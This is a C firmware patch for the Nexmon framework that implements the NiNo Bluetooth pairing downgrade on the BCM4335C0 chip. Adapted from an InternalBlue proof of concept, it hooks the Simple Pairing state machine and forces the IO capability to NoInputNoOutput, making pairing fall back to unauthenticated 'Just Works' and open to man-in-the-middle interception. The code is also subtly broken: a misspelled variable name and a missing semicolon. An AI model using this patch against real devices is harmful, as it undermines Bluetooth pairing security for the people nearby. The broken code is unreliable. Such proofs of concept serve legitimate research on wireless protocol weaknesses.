
/*
 * Assembly and structure taken from: 
 * https://github.com/seemoo-lab/internalblue/blob/master/examples/NiNo_PoC.py
 */

#pragma NEXMON targetregion "patch"
#include <firmware_version.h>
#include <patcher.h>

#define HOOK_IO_CAP_RESP		  0x303D4	  // we just change the complete simple pairing state machine
#define ASM_LOCATION_IO_CAP_RESP  0x00211800  // 0xd7800 -> alternative memory area for the patch to be placed
#define IO_CAP_NO_INPUT_NO_OUTPUT 0x03		  // 

__attribute__((at(ASM_LOCATION_IO_CAP_RESP, "", CHIP_VER_BCM4335C0_BT)))
__attribute__((optimize("O0")))
void nino_payload(void){
	// restore original 8 bytes of instructions which we overwrite by patching a branch into it
	__asm__(
			"push {r4-r6, lr}\n\t"
			"mov  r4, r0\n\t"
			);


	// overwrite variables used by sp_sm_io_cap_req_reply__lmp_io_cap_req_res_30286
    // which actually executes:
    //   send_LMP_IO_Capability_req_301E4
    //   send_LMP_IO_Capability_res_30170


	// Assembly represented by the code below:
	//  push {r0-r1, lr}    //variables we need in our actual subroutine here      
	//  ldr  r1, =0x20387D  //io_caps__auth_req_20387D
    //  oob and auth_req are already set to 0x00...
    //  ldrb r0, =0x03      //io_cap 0x03: NoInputNoOutput
    //  strb r0, [r1] 
	//  pop  {r0-r1, lr} 
	char* io_1aps_auth_req = (char*)0x20387D;  //io_caps__auth_req_20387D
	*io_caps_auth_req = IO_CAP_NO_INPUT_NO_OUTPUT;


    // branch back into simple_pairing_state_machine_303D4 but without our branch
    // locret: 
    //    b    0x303D8
	// --> this patch get's called from HOOK_IO_CAP_RESP and with a return we return to
	//     HOOK_IO_CAP_RESP + 4 bytes (since we're using a branch to jump into this patch 
	//     (which is actually 4 bytes long)
	return
}


__attribute__((at(HOOK_IO_CAP_RESP, "", CHIP_VER_BCM4335C0_BT, FW_VER_1_BT)))
BPatch(nino_payload, nino_payload)














